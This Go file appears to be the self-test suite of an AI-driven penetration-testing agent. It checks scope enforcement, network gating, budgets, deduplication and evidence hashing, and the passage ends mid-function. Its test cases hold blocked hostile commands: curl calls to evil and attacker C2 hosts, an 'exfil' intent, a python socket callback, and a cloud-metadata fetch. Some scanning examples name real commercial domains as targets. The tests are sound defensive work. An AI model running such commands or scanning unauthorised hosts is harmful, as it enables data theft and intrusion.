// Package selftest 是 ARGUS 的部署后自检：不依赖 `go test`，可在任意机器上跑。
//
// 背景：企业 DLP 环境里 go.exe 生成的 _testmain.go 会被加密，导致 `go test` 无法运行。
// 为了让"安全不变量"在任何环境都能被验证，把关键断言做成了可执行子命令：
//
//	argus selftest
package selftest

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/argus/argus/internal/agent"
	"github.com/argus/argus/internal/api"
	"github.com/argus/argus/internal/attack"
	"github.com/argus/argus/internal/budget"
	"github.com/argus/argus/internal/dedupe"
	"github.com/argus/argus/internal/egress"
	"github.com/argus/argus/internal/engine"
	"github.com/argus/argus/internal/evidence"
	"github.com/argus/argus/internal/gate"
	"github.com/argus/argus/internal/netguard"
	"github.com/argus/argus/internal/planner"
	"github.com/argus/argus/internal/scope"
	"github.com/argus/argus/internal/settings"
	"github.com/argus/argus/internal/store"
	"github.com/argus/argus/internal/toolbox"
)

// Result 是一项检查的结果。
type Result struct {
	Name string
	Err  error
}

func (r Result) String() string {
	if r.Err == nil {
		return "PASS  " + r.Name
	}
	return "FAIL  " + r.Name + "  ← " + r.Err.Error()
}

func check(name string, fn func() error) Result {
	if err := fn(); err != nil {
		return Result{Name: name, Err: err}
	}
	return Result{Name: name}
}

// Run 执行全部检查。
func Run() []Result {
	return []Result{
		check("scope: 空范围默认拒绝", checkEmptyScope),
		check("scope: 域名/子域/端口归一化", checkDomainMatch),
		check("scope: 相似域不能绕过", checkLookalike),
		check("scope: CIDR 与 IP", checkCIDR),
		check("gate: 12 个越界目标全部拦截", checkOutOfScope),
		check("gate: 云元数据永远拒绝（含显式配置）", checkMetadata),
		check("gate: 域名解析与钉住语义", checkResolveAndPin),
		check("network: 未授权 IP 被第 3 层独立拦截", checkLayer3Deny),
		check("network: 已钉住的域名 IP 放行", checkLayer3Allow),
		check("budget: 超限拒绝且不落扣减", checkBudget),
		check("dedupe: 相同意图指纹只放行一次", checkDedupe),
		check("evidence: 哈希链可校验且能发现篡改", checkEvidence),
		check("attack: 漏洞类别映射 ATT&CK", checkAttack),
		check("engine: 端到端闭环（收敛/拦截/去重/证据）", checkEngine),
		check("api: 无范围任务被拒 + 有范围可运行 + 报告可导出", checkAPI),
		check("compat: 资产/命令/统计来自真实链路，越界目标不入资产图", checkCompat),
		check("persist: 落盘后重新打开数据完整", checkPersist),
		check("planner: LLM 规划器解析意图并计量 token（未配置时收敛）", checkPlanner),
		check("pipeline: 规则层(deny/ask) + 真实HTTP + 流量录制 + 事实沉淀", checkPipeline),
		check("toolbox: 沙箱拒绝注入/越权工具/危险参数，且真实执行可用", checkToolbox),
		check("container: 隔离参数完整 + 缺运行时时失败关闭", checkContainer),
		check("egress: 范围→网关白名单与闸门同源", checkEgress),
		check("report: 报告含命令回放（结论可复现）", checkReport),
		check("planner-env: 执行环境(OS/可用命令)注入提示词", checkPlannerEnv),
		check("cdn: 域名授权后 CDN 轮询出的新 IP 可放行，元数据地址仍拒绝", checkCDNPin),
		check("violation-scope: 越界台账严格按任务过滤（历史记录不污染新任务）", checkViolationScoped),
		check("resume: 停止后残留的 running 意图会被重新执行", checkResume),
		check("long-run: 生产默认不因空轮收敛（只有目标达成/超时/停止才结束）", checkLongRun),
		check("placeholder: 模型编造的占位目标在生成时被过滤", checkPlaceholder),
		check("goal-contract: 零产出不允许收尾，拒绝理由进入提示词", checkGoalContract),
	}
}

// checkGoalContract 锁住"不许空手宣布完成"这条契约。
//
// 真实场景：模型可以在一条动作都没跑成的情况下返回 goal_met=true，
// 任务就这样"正常结束"了 —— 用户看到的是"跑了一会儿，什么都没挖到"。
func checkGoalContract() error {
	cfg := engine.DefaultConfig()
	if cfg.MinDoneBeforeGoalMet <= 0 {
		return fmt.Errorf("默认配置应设置收尾门槛（MinDoneBeforeGoalMet），实际 %d", cfg.MinDoneBeforeGoalMet)
	}

	p := planner.New(settings.Open(""))
	p.SetGoalRejected("当前只有 2 条动作完成、0 个已确认漏洞，未达到收尾门槛（10 条）")
	st := store.NewMemory()
	t, err := st.CreateTask(store.Task{Name: "goal", Goal: "挖到漏洞", Workers: 1})
	if err != nil {
		return err
	}
	_, user := p.PromptFor(t, st)
	for _, want := range []string{"收尾被拒绝", "未达到收尾门槛", "不能返回 goal_met"} {
		if !strings.Contains(user, want) {
			return fmt.Errorf("提示词缺少 %q，模型会反复声明完成：\n%s", want, excerptOf(user))
		}
	}

	// 字典必须能落盘并可被 ffuf 用相对路径引用
	dir := filepath.Join(os.TempDir(), "argus-wl-test")
	defer os.RemoveAll(dir)
	wlPath, n, err := toolbox.EnsureWordlist(dir)
	if err != nil {
		return fmt.Errorf("内置字典写入失败: %w", err)
	}
	if n < 100 {
		return fmt.Errorf("字典条目过少（%d），扫不出东西", n)
	}
	if _, statErr := os.Stat(wlPath); statErr != nil {
		return fmt.Errorf("字典文件不存在: %v", statErr)
	}
	return nil
}

// checkPlaceholder 锁住"别让 example.invalid 这类占位目标进执行"这条约束。
//
// 真实观测：448 条意图里 99 条被拦，其中相当一部分是模型编造的
// example.invalid / dns-brute.domain —— 必然失败，纯浪费轮次。
func checkPlaceholder() error {
	bad := []string{
		`{"command":"curl http://example.com/"}`,
		`{"command":"nmap dns-brute.domain"}`,
		`{"command":"curl https://api.example.invalid/"}`,
		`{"command":"nmap <domain>"}`,
		`{"command":"nmap your-domain.com"}`,
	}
	for _, s := range bad {
		if !planner.IsPlaceholderTarget(s) {
			return fmt.Errorf("应识别为占位目标: %s", s)
		}
	}
	good := []string{
		`{"command":"nmap -sV -Pn www.levoit.com"}`,
		`{"command":"nuclei -u https://levoit.com -severity high"}`,
	}
	for _, s := range good {
		if planner.IsPlaceholderTarget(s) {
			return fmt.Errorf("真实目标被误判为占位: %s", s)
		}
	}
	return nil
}

// checkLongRun 锁住"任务不会因为暂时没产出就自己结束"这条契约。
//
// 对齐 ARTEX：唯一的正常结束条件是"全部目标被证据证明"（goal_met），
// 其余是超时与手动停止。之前我们按"3 轮无产出"收敛，导致目标没打完就 done。
func checkLongRun() error {
	cfg := engine.DefaultConfig()
	if cfg.IdleRounds != 0 {
		return fmt.Errorf("生产默认 IdleRounds 应为 0（不因空轮结束），实际 %d", cfg.IdleRounds)
	}
	if cfg.StagnantRounds <= 0 {
		return fmt.Errorf("停滞提示阈值应 > 0，实际 %d", cfg.StagnantRounds)
	}

	// 未调用模型时，规划器不能声称目标达成
	var gm interface{ GoalMet() bool } = planner.New(settings.Open(""))
	if gm.GoalMet() {
		return fmt.Errorf("未调用模型时不应声明目标达成")
	}

	// 停滞状态可注入，且不影响 GoalMet
	p := planner.New(settings.Open(""))
	p.SetStagnation(5, 3)
	if p.GoalMet() {
		return fmt.Errorf("注入停滞不应等同于目标达成")
	}
	return nil
}

// checkResume 锁住"停止 → 启动 = 续跑"的语义。
//
// 上次被停止时，正在执行的意图可能停在 running；如果不重置，它永远不会再被领取，
// 用户看到的就是"续跑了但少做了几条"。
func checkResume() error {
	script := [][]store.Intent{{}} // 规划器不再产出新意图
	st, _, eng, _ := harness(script)
	task, err := st.CreateTask(store.Task{Name: "resume", Goal: "续跑", Workers: 1})
	if err != nil {
		return err
	}
	it, err := st.AddIntent(store.Intent{
		TaskID: task.ID, Action: "Bash", Summary: `{"command":"echo resume"}`, ParamKey: "resume",
	})
	if err != nil {
		return err
	}
	if !st.ClaimIntent(task.ID, it.ID, "w1") {
		return fmt.Errorf("预置意图领取失败")
	}
	if got := st.Intents(task.ID)[0].State; got != store.IntentRunning {
		return fmt.Errorf("预置状态应为 running，实际 %s", got)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	if _, err := eng.RunTask(ctx, task.ID); err != nil {
		return err
	}
	if got := st.Intents(task.ID)[0].State; got != store.IntentDone {
		return fmt.Errorf("续跑应把遗留的 running 意图重新执行完，实际 %s", got)
	}
	return nil
}

// checkViolationScoped 锁住"越界台账按任务隔离"这条契约。
//
// 真实故障：CheckDial 记越界时没带 TaskID（落成 0），查询端又把 TaskID==0 当成
// "全局记录"塞进每个任务视图 —— 结果是历史的 15 条 network 拦截永远挂在新任务下面，
// 看起来像"修了也没生效"。
func checkViolationScoped() error {
	st := store.NewMemory()
	t1, err := st.CreateTask(store.Task{Name: "a", Goal: "g", Workers: 1})
	if err != nil {
		return err
	}
	t2, err := st.CreateTask(store.Task{Name: "b", Goal: "g", Workers: 1})
	if err != nil {
		return err
	}
	st.RecordViolation(gate.Violation{TaskID: t1.ID, Layer: gate.LayerNetwork, Target: "203.0.113.1", Reason: "越界"})
	// 早期版本写入的无任务号记录
	st.RecordViolation(gate.Violation{TaskID: 0, Layer: gate.LayerNetwork, Target: "203.0.113.2", Reason: "legacy"})

	if n := len(st.Violations(t1.ID)); n != 1 {
		return fmt.Errorf("任务 1 应只有自己的 1 条越界，实际 %d", n)
	}
	if n := len(st.Violations(t2.ID)); n != 0 {
		return fmt.Errorf("任务 2 不应看到任何越界（历史记录不能串台），实际 %d", n)
	}
	return nil
}

// funcResolver 让测试可以模拟"每次解析返回不同 IP"（CDN 的典型行为）。
type funcResolver func(ctx context.Context, host string) ([]netip.Addr, error)

func (f funcResolver) Lookup(ctx context.Context, host string) ([]netip.Addr, error) { return f(ctx, host) }

// checkCDNPin 锁住这条契约：**授权的对象是域名，不是某一批 IP**。
//
// 真实故障：cosori.com 解析到 Cloudflare 轮询出的 8 个不同 IP，
// 第 2 层钉住第一批，执行阶段解析到新 IP 就被第 3 层当成越界，
// 用户看到"我明明授权了域名，却整页都是网络层拦截"。
func checkCDNPin() error {
	sc, err := scope.New([]scope.Rule{{Kind: scope.KindDomainSuffix, Value: "cdn.test"}})
	if err != nil {
		return err
	}
	cur := netip.MustParseAddr("10.20.0.5")
	res := funcResolver(func(_ context.Context, _ string) ([]netip.Addr, error) {
		return []netip.Addr{cur}, nil
	})
	g := gate.New(sc, res, nil)
	ctx := context.Background()

	dec := g.CheckTool(ctx, 1, 1, "curl", []byte(`{"url":"http://www.cdn.test/"}`))
	if !dec.Allowed {
		return fmt.Errorf("授权域名应放行: %s", dec.Reason)
	}
	if err := g.CheckDial(cur); err != nil {
		return fmt.Errorf("第一轮解析出的 IP 应可拨: %v", err)
	}

	// CDN 换了一批 IP：未补钉时第 3 层必须拦住（否则等于放行任意 IP）
	next := netip.MustParseAddr("10.20.0.9")
	if err := g.CheckDial(next); err == nil {
		return fmt.Errorf("未经域名解析的新 IP 不应直接放行")
	}
	// preflight 会把本次解析结果补钉，补钉后应放行
	g.PinIPs([]netip.Addr{next})
	if err := g.CheckDial(next); err != nil {
		return fmt.Errorf("同一授权域名解析出的新 IP 应放行: %v", err)
	}

	// AdmitHost 必须同时把 IP 钉住：CheckDial 只认 pinned，
	// 只记"域名→IP"缓存是不算数的（曾经因此让授权域名满屏 network 拦截）。
	fresh := netip.MustParseAddr("10.20.0.77")
	if err := g.AdmitHost("www.cdn.test", []netip.Addr{fresh}); err != nil {
		return fmt.Errorf("AdmitHost 应接受授权子域: %v", err)
	}
	if err := g.CheckDial(fresh); err != nil {
		return fmt.Errorf("AdmitHost 之后 CheckDial 必须放行: %v", err)
	}
	// 元数据地址是永久红线，pin 也不能放行
	meta := netip.MustParseAddr("169.254.169.254")
	g.PinIPs([]netip.Addr{meta})
	if err := g.CheckDial(meta); err == nil {
		return fmt.Errorf("云元数据地址不能被钉住放行")
	}
	// 未授权域名即使传 IP 也不能被放行
	if err := g.AdmitHost("evil.other.test", []netip.Addr{netip.MustParseAddr("10.20.0.88")}); err == nil {
		return fmt.Errorf("范围外域名不应被 AdmitHost 放行")
	}
	return nil
}

// checkPlannerEnv 锁住"模型知道自己跑在什么环境里"这条契约。
// 没有它，模型会按 Linux 习惯生成 getent / ss / 管道串联，全部撞在沙箱或工具缺失上。
func checkPlannerEnv() error {
	st := store.NewMemory()
	t, err := st.CreateTask(store.Task{Name: "env", Goal: "环境注入", Workers: 1})
	if err != nil {
		return err
	}
	p := planner.NewWithEnv(settings.Open(""), func() planner.Env {
		return planner.Env{
			OS: "windows", Arch: "amd64",
			Tools:   []string{"curl", "nmap"},
			Missing: []string{"dig", "sqlmap"},
		}
	})
	_, user := p.PromptFor(t, st)
	for _, want := range []string{"执行环境", "windows/amd64", "curl, nmap", "dig, sqlmap", "getent"} {
		if !strings.Contains(user, want) {
			return fmt.Errorf("提示词缺少 %q：\n%s", want, excerptOf(user))
		}
	}

	// 不注入 env 时保持原样（避免把测试专用文案泄漏到默认路径）
	_, plain := planner.New(settings.Open("")).PromptFor(t, st)
	if strings.Contains(plain, "## 执行环境") {
		return fmt.Errorf("未注入 env 时不应出现执行环境段")
	}
	return nil
}

func testScope() *scope.Scope {
	sc, err := scope.New([]scope.Rule{
		{Kind: scope.KindDomainSuffix, Value: "lab.internal"},
		{Kind: scope.KindCIDR, Value: "10.20.0.0/16"},
	})
	if err != nil {
		panic(err)
	}
	return sc
}

var testResolver = gate.StaticResolver{Map: map[string][]string{
	"lab.internal":        {"10.20.0.5"},
	"api.lab.internal":    {"10.20.0.6"},
	"evil.example.com":    {"203.0.113.9"},
	"rebind.lab.internal": {"10.20.0.7", "203.0.113.10"},
	"meta.lab.internal":   {"169.254.169.254"},
}}

func checkEmptyScope() error {
	sc, err := scope.New(nil)
	if err != nil {
		return err
	}
	if sc.AllowsHost("lab.internal") {
		return fmt.Errorf("空范围必须拒绝")
	}
	g := gate.New(sc, testResolver, nil)
	d := g.CheckTool(context.Background(), 1, 1, "Bash", json.RawMessage(`{"command":"curl http://lab.internal/"}`))
	if d.Allowed {
		return fmt.Errorf("空范围下工具调用应被拒绝")
	}
	if d.Layer != gate.LayerExec {
		return fmt.Errorf("拒绝层应为 exec，实际 %s", d.Layer)
	}
	return nil
}

func checkDomainMatch() error {
	sc := testScope()
	cases := []struct {
		host string
		want bool
	}{
		{"lab.internal", true},
		{"API.LAB.INTERNAL", true},
		{"lab.internal:8080", true},
		{"a.b.lab.internal", true},
		{"lab.internal.", true},
		{"labinternal", false},
	}
	for _, tc := range cases {
		if got := sc.AllowsHost(tc.host); got != tc.want {
			return fmt.Errorf("AllowsHost(%q)=%v want %v", tc.host, got, tc.want)
		}
	}
	return nil
}

func checkLookalike() error {
	sc := testScope()
	for _, h := range []string{"evil-lab.internal", "lab.internal.evil.io", "labinternal.com"} {
		if sc.AllowsHost(h) {
			return fmt.Errorf("%q 不应被放行（相似域绕过）", h)
		}
	}
	return nil
}

func checkCIDR() error {
	sc := testScope()
	if !sc.AllowsIP(netip.MustParseAddr("10.20.3.4")) {
		return fmt.Errorf("10.20.3.4 应在 10.20.0.0/16 内")
	}
	if sc.AllowsIP(netip.MustParseAddr("10.21.0.1")) {
		return fmt.Errorf("10.21.0.1 不应在范围内")
	}
	return nil
}

func checkOutOfScope() error {
	sc := testScope()
	g := gate.New(sc, testResolver, nil)
	cases := []struct {
		tool  string
		input string
	}{
		{"Bash", `{"command":"curl http://evil.example.com/x"}`},
		{"Bash", `{"command":"nmap -Pn 8.8.8.8"}`},
		{"Bash", `{"command":"nmap -Pn 1.1.1.1 -p 443"}`},
		{"Bash", `{"command":"curl http://203.0.113.9/"}`},
		{"WebFetch", `{"url":"https://api.github.com/repos"}`},
		{"WebFetch", `{"url":"http://lab.internal.evil.io/"}`},
		{"Bash", `{"command":"dig @8.8.8.8 lab.internal"}`},
		{"Bash", `{"text":"ssh root@10.99.0.1"}`},
		{"Bash", `{"command":"curl -H 'Host: other.example.com' http://10.20.0.5/"}`},
		{"Write", `{"path":"/tmp/x","content":"callback to https://attacker.tld/c2"}`},
		{"Bash", `{"command":"python3 -c 'import socket; socket.create_connection((\"evil.example.com\",80))'"}`},
		{"Bash", `{"command":"curl http://169.254.169.254/latest/meta-data/"}`},
	}
	for _, c := range cases {
		if d := g.CheckTool(context.Background(), 1, 1, c.tool, json.RawMessage(c.input)); d.Allowed {
			return fmt.Errorf("应拦截但放行了: %s %s", c.tool, c.input)
		}
	}
	return nil
}

func checkMetadata() error {
	sc := testScope()
	g := gate.New(sc, testResolver, nil)
	for _, ip := range []string{"169.254.169.254", "100.100.100.200", "fd00:ec2::254"} {
		if err := g.CheckDial(netip.MustParseAddr(ip)); err == nil {
			return fmt.Errorf("%s 必须被拒绝（云元数据）", ip)
		}
	}
	sc2, _ := scope.New([]scope.Rule{{Kind: scope.KindCIDR, Value: "169.254.0.0/16"}})
	g2 := gate.New(sc2, testResolver, nil)
	if err := g2.CheckDial(netip.MustParseAddr("169.254.169.254")); err == nil {
		return fmt.Errorf("元数据地址不允许通过范围配置放开")
	}
	return nil
}

func checkResolveAndPin() error {
	sc := testScope()
	g := gate.New(sc, gate.StaticResolver{Map: map[string][]string{
		"rebind.lab.internal": {"203.0.113.10"},
	}}, nil)
	d := g.CheckTool(context.Background(), 1, 1, "Bash", json.RawMessage(`{"command":"curl http://rebind.lab.internal/"}`))
	if !d.Allowed {
		return fmt.Errorf("范围内域名应放行: %s", d.Reason)
	}
	if err := g.CheckDial(netip.MustParseAddr("203.0.113.10")); err != nil {
		return fmt.Errorf("域名授权解析出的 IP 应被钉住放行: %v", err)
	}
	if err := g.CheckDial(netip.MustParseAddr("203.0.113.11")); err == nil {
		return fmt.Errorf("未钉住的同网段 IP 不应被放行")
	}
	g2 := gate.New(sc, gate.StaticResolver{Map: map[string][]string{
		"evil.lab.internal": {"169.254.169.254"},
	}}, nil)
	if d2 := g2.CheckTool(context.Background(), 1, 1, "Bash", json.RawMessage(`{"command":"curl http://evil.lab.internal/"}`)); d2.Allowed {
		return fmt.Errorf("解析到元数据 IP 的域名必须被拒绝")
	}
	return nil
}

func checkLayer3Deny() error {
	sc := testScope()
	g := gate.New(sc, testResolver, nil)
	for _, ip := range []string{"1.1.1.1", "203.0.113.9", "10.99.0.1"} {
		if err := g.CheckDial(netip.MustParseAddr(ip)); err == nil {
			return fmt.Errorf("%s 应被第 3 层拦截", ip)
		}
	}
	if err := g.CheckDial(netip.MustParseAddr("10.20.1.1")); err != nil {
		return fmt.Errorf("范围内 IP 不应被拦截: %v", err)
	}
	return nil
}

func checkLayer3Allow() error {
	sc := testScope()
	g := gate.New(sc, testResolver, nil)
	d := g.CheckTool(context.Background(), 1, 1, "Bash", json.RawMessage(`{"command":"curl http://api.lab.internal/health"}`))
	if !d.Allowed {
		return fmt.Errorf("范围内域名应放行，实际: %s", d.Reason)
	}
	if err := g.CheckDial(netip.MustParseAddr("10.20.0.6")); err != nil {
		return fmt.Errorf("已钉住的 IP 应放行: %v", err)
	}
	return nil
}

func checkBudget() error {
	b := budget.New()
	b.SetCap(budget.ScopeTask, "1", budget.KindSteps, 10)
	if err := b.Charge(budget.ScopeTask, "1", budget.KindSteps, 8); err != nil {
		return fmt.Errorf("首次记账不应失败: %v", err)
	}
	if err := b.Charge(budget.ScopeTask, "1", budget.KindSteps, 5); err == nil {
		return fmt.Errorf("超限应报错")
	}
	if got := b.Used(budget.ScopeTask, "1", budget.KindSteps); got != 8 {
		return fmt.Errorf("超限后不得扣减，实际 used=%d", got)
	}
	b2 := budget.New()
	b2.SetCap(budget.ScopeIntent, "i1", budget.KindSteps, 100)
	b2.SetCap(budget.ScopeTask, "t1", budget.KindSteps, 3)
	err := b2.ChargeAll([]budget.ChargeItem{
		{Scope: budget.ScopeIntent, ID: "i1", Kind: budget.KindSteps, N: 2},
		{Scope: budget.ScopeTask, ID: "t1", Kind: budget.KindSteps, N: 5},
	})
	if err == nil {
		return fmt.Errorf("任一作用域超限应整体失败")
	}
	if b2.Used(budget.ScopeIntent, "i1", budget.KindSteps) != 0 {
		return fmt.Errorf("整体失败时不应扣减 intent 用量")
	}
	return nil
}

func checkDedupe() error {
	r := dedupe.New()
	fp1 := dedupe.Fingerprint(7, "Bash", "b=2&a=1")
	fp2 := dedupe.Fingerprint(7, "bash", " a=1 & b=2 ")
	if fp1 != fp2 {
		return fmt.Errorf("参数签名规范化失败: %s != %s", fp1, fp2)
	}
	if _, dup := r.Claim(fp1, 0); dup {
		return fmt.Errorf("首次占用不应判重")
	}
	if _, dup := r.Claim(fp2, 0); !dup {
		return fmt.Errorf("相同指纹应判重")
	}
	if r.Len() != 1 {
		return fmt.Errorf("指纹表长度应为 1，实际 %d", r.Len())
	}
	return nil
}

func checkEvidence() error {
	ev, err := evidence.Open("")
	if err != nil {
		return err
	}
	if _, err := ev.Append(1, 1, "command", map[string]string{"cmd": "echo hi"}); err != nil {
		return err
	}
	if _, err := ev.Append(1, 2, "finding", map[string]string{"v": "sqli"}); err != nil {
		return err
	}
	if err := ev.Verify(); err != nil {
		return fmt.Errorf("链校验失败: %v", err)
	}
	list := ev.List(1, 0)
	if len(list) != 2 {
		return fmt.Errorf("应有 2 条证据，实际 %d", len(list))
	}
	if list[0].PrevHash != list[1].Hash {
		return fmt.Errorf("哈希链未正确链接")
	}
	return nil
}

func checkAttack() error {
	t, ok := attack.Map("SQL 注入")
	if !ok || t.ID != "T1190" {
		return fmt.Errorf("SQL 注入应映射 T1190，实际 %+v ok=%v", t, ok)
	}
	if t2, ok2 := attack.Map("反弹 shell"); !ok2 || t2.ID != "T1071" {
		return fmt.Errorf("反弹 shell 应映射 T1071，实际 %+v", t2)
	}
	if _, ok3 := attack.Map("某个没见过的类别"); ok3 {
		return fmt.Errorf("未知类别应返回兜底并标记 false")
	}
	draft := attack.SigmaDraft(t, "SQL 注入", "api.lab.internal", "ev-000001")
	for _, want := range []string{"title:", "logsource:", "detection:", "T1190"} {
		if !strings.Contains(draft, want) {
			return fmt.Errorf("Sigma 草稿缺少 %q", want)
		}
	}
	return nil
}

func harness(script [][]store.Intent) (*store.Memory, *gate.Gate, *engine.Engine, *evidence.Store) {
	st := store.NewMemory()
	ev, _ := evidence.Open("")
	b := budget.New()
	sc := testScope()
	g := gate.New(sc, testResolver, st)
	exec := &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
	pl := agent.NewSimPlanner(script)
	cfg := engine.DefaultConfig()
	cfg.Debounce = 50 * time.Millisecond
	cfg.Heartbeat = 2 * time.Second
	cfg.IdleRounds = 2
	cfg.Workers = 3
	return st, g, engine.New(st, exec, pl, b, cfg), ev
}

func checkEngine() error {
	script := [][]store.Intent{
		{
			{Action: "Bash", Summary: `{"command":"nmap -sV lab.internal"}`, AssetID: 1, ParamKey: "scan"},
			{Action: "Bash", Summary: `{"command":"curl http://evil.example.com/x"}`, AssetID: 2, ParamKey: "exfil"},
		},
		{
			{Action: "Bash", Summary: `{"command":"curl 'http://api.lab.internal/u?id=1%27"}`, AssetID: 3,
				ParamKey: "sqli", VulnClass: "SQL 注入", Severity: "high", Target: "api.lab.internal"},
		},
		{
			{Action: "Bash", Summary: `{"command":"nmap -sV lab.internal"}`, AssetID: 1, ParamKey: "scan"},
		},
	}
	st, _, eng, _ := harness(script)
	t, err := st.CreateTask(store.Task{Name: "selftest", Goal: "闭环", Workers: 3})
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	sum, err := eng.RunTask(ctx, t.ID)
	if err != nil {
		return err
	}
	if sum.Dispatched != 3 {
		return fmt.Errorf("应派发 3 条（第 4 条被去重），实际 %d", sum.Dispatched)
	}
	if sum.Duplicates != 1 {
		return fmt.Errorf("应记录 1 次去重，实际 %d", sum.Duplicates)
	}
	if sum.Done != 2 || sum.Blocked != 1 {
		return fmt.Errorf("应 2 完成 1 拦截，实际 done=%d blocked=%d", sum.Done, sum.Blocked)
	}
	if len(st.Findings(t.ID)) != 1 {
		return fmt.Errorf("应产出 1 条 finding，实际 %d", len(st.Findings(t.ID)))
	}
	if len(st.Violations(t.ID)) < 1 {
		return fmt.Errorf("应记录越界事件")
	}
	if sum.State != store.TaskDone {
		return fmt.Errorf("任务终态应为 done，实际 %s", sum.State)
	}
	return nil
}

// checkCompat 锁住"兼容接口 = 真实数据"这条契约，并验证资产图的干净性：
// 只有通过三层闸门的目标才会进资产，被拦的越界目标绝不能出现。
func checkCompat() error {
	script := [][]store.Intent{
		{
			{Action: "Bash", Summary: `{"command":"nmap -sV lab.internal"}`, AssetID: 1, ParamKey: "scan"},
			{Action: "Bash", Summary: `{"command":"curl http://evil.example.com/x"}`, AssetID: 2, ParamKey: "exfil"},
		},
		{
			{Action: "Bash", Summary: `{"command":"sqlmap -u http://api.lab.internal/u?id=1"}`, AssetID: 3,
				ParamKey: "sqli", VulnClass: "SQL 注入", Severity: "high", Target: "api.lab.internal"},
		},
	}
	st, _, eng, ev := harness(script)
	task, err := st.CreateTask(store.Task{Name: "compat", Goal: "兼容接口契约", Workers: 3})
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if _, err := eng.RunTask(ctx, task.ID); err != nil {
		return err
	}

	srv := api.New(api.Deps{
		Store: st, Ev: ev, Budget: budget.New(), Token: "",
		NewGate: func(_ int64, s *scope.Scope, sink gate.Sink) *gate.Gate {
			return gate.New(s, testResolver, sink)
		},
		NewExec: func(_ int64, g *gate.Gate) engine.Executor {
			return &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
		},
		NewPlanner: func(int64) engine.Planner { return agent.NewSimPlanner(nil) },
	})
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()

	var stats struct {
		Assets            int `json:"assets"`
		FindingsConfirmed int `json:"findings_confirmed"`
	}
	if err := getJSONFrom(ts.URL+"/api/stats", &stats); err != nil {
		return err
	}
	if stats.Assets < 1 {
		return fmt.Errorf("/api/stats 资产数应 ≥1，实际 %d", stats.Assets)
	}
	if stats.FindingsConfirmed != 1 {
		return fmt.Errorf("/api/stats 已确认漏洞应为 1，实际 %d", stats.FindingsConfirmed)
	}

	var assets struct {
		Total  int `json:"total"`
		Assets []struct {
			Domain string `json:"domain"`
			IP     string `json:"ip"`
		} `json:"assets"`
	}
	if err := getJSONFrom(ts.URL+"/api/assets", &assets); err != nil {
		return err
	}
	for _, a := range assets.Assets {
		if a.Domain == "evil.example.com" || a.IP == "evil.example.com" {
			return fmt.Errorf("越界目标不应进入资产图: %v", a)
		}
	}
	if len(assets.Assets) < 1 {
		return fmt.Errorf("/api/assets 至少应有 1 条（放行过的目标）")
	}

	var cmds struct {
		Total    int `json:"total"`
		Commands []struct {
			Tool string `json:"tool"`
		} `json:"commands"`
	}
	if err := getJSONFrom(ts.URL+"/api/commands", &cmds); err != nil {
		return err
	}
	if cmds.Total < 1 {
		return fmt.Errorf("/api/commands 应至少有 1 条执行记录，实际 %d", cmds.Total)
	}

	var cov struct {
		Denominator int `json:"denominator"`
	}
	if err := getJSONFrom(ts.URL+fmt.Sprintf("/api/tasks/%d/coverage", task.ID), &cov); err != nil {
		return err
	}
	if cov.Denominator < 1 {
		return fmt.Errorf("/api/tasks/{id}/coverage 分母应 ≥1，实际 %d", cov.Denominator)
	}
	return nil
}

// checkPersist 验证"重启不丢"：任务/意图/漏洞/资产/越界都要能从快照恢复。
func checkPersist() error {
	dir, err := os.MkdirTemp("", "argus-persist")
	if err != nil {
		return err
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, "state.json")

	st, err := store.Open(path)
	if err != nil {
		return err
	}
	t, err := st.CreateTask(store.Task{Name: "p", Goal: "g", Workers: 1})
	if err != nil {
		return err
	}
	if _, err := st.AddIntent(store.Intent{TaskID: t.ID, Summary: "s", Action: "Bash", ParamKey: "k"}); err != nil {
		return err
	}
	if _, err := st.AddFinding(store.Finding{TaskID: t.ID, VulnClass: "SQL 注入", Severity: "high", Title: "x", EvidenceID: "ev-1"}); err != nil {
		return err
	}
	st.UpsertAsset(t.ID, "subdomain", "lab.internal")
	st.RecordViolation(gate.Violation{TaskID: t.ID, Layer: gate.LayerExec, Target: "evil", Reason: "范围外"})
	if err := st.Save(); err != nil {
		return fmt.Errorf("落盘失败: %v", err)
	}

	st2, err := store.Open(path)
	if err != nil {
		return fmt.Errorf("重新打开失败: %v", err)
	}
	if got := len(st2.ListTasks()); got != 1 {
		return fmt.Errorf("任务未恢复: %d", got)
	}
	if got := len(st2.Intents(t.ID)); got != 1 {
		return fmt.Errorf("意图未恢复: %d", got)
	}
	if got := len(st2.Findings(t.ID)); got != 1 {
		return fmt.Errorf("漏洞未恢复: %d", got)
	}
	if assets, _ := st2.Assets(t.ID, "", 0, 0); len(assets) != 1 {
		return fmt.Errorf("资产未恢复: %d", len(assets))
	}
	if got := len(st2.Violations(t.ID)); got != 1 {
		return fmt.Errorf("越界记录未恢复: %d", got)
	}
	return nil
}

// checkPlanner 用一个假的 chat/completions 服务验证：
//   - 能解析模型输出的 JSON（含被 ``` 包裹的情况）；
//   - token 用量被上报（供预算熔断）；
//   - 未配置模型时不产出意图（任务自然收敛，不空转）。
func checkPlanner() error {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if got := r.Header.Get("Authorization"); got != "Bearer test-key" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		// 故意用 ```json 包裹 + 前后噪声，验证"防御性解析"。
		content := "好的，结果如下：\n```json\n" +
			`{"intents":[{"action":"Bash","summary":"{\"command\":\"nmap lab.internal\"}","param_key":"scan","asset_id":1}]}` +
			"\n```\n以上。"
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"choices": []any{map[string]any{"message": map[string]any{"content": content}}},
			"usage":   map[string]any{"total_tokens": 123},
		})
	}))
	defer srv.Close()

	st := store.NewMemory()
	t, err := st.CreateTask(store.Task{Name: "p", Goal: "评估 lab.internal", Workers: 1})
